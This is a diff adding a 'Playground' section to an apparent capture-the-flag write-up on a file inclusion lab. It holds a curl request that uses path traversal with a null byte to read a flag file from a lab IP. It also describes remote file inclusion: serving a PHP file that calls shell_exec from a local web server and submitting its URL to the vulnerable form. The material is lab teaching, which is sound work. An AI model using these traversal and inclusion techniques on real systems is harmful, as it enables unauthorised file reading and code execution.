@@ -28,3 +28,13 @@ curl 'http://10.82.142.65/challenges/chall3.php' \
   --data-raw 'file=..%2F..%2F..%2F..%2Fetc%2Fflag3%00' \
   --insecure --output flag3.html
 ```
+
+## Playground
+I know the question talks about RCE and RFI, but it asks to execute the `hostname` command, which basically reads the content of the hostname file. So I just used path traversal to read the `/etc/hostname` file.
+
+If you wanted to do it the RFI way, you would:
+1. Create a hostname.php file that executes the hostname command, e.g. `<?php echo shell_exec("hostname"); ?>`
+
+2. Host it locally using a web server (e.g. `python -m http.server <IP> <PORT>`)
+
+3. Input the URL to the inptut form `http://<IP>:<PORT>/hostname.php`
